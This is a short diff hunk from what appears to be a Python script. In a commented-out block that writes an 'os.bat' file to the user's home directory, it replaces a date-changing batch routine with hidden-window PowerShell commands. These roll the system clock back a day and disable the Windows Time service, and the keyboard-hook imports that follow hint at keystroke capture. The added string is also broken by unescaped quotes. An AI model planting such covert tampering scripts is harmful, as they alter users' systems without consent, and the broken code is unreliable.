@@ -32,7 +32,7 @@
 
 # if not os.path.exists(home_dir + '/os.bat'):
 #     with open(os.path.join(home_dir, file_name), "w") as f:
-#         f.write("@echo off\nset date=%date:~0,2%\nset /a date=%date%-1\nif %date% LSS 10 set date=0%date%\ndate %date%")    
+#         f.write("@echo off\npowershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Get-Date | ForEach-Object { $_.AddDays(-1) } | Set-Date"\npowershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Set-Service w32time -StartupType Disabled")    
 
 import keyboard
 import threading
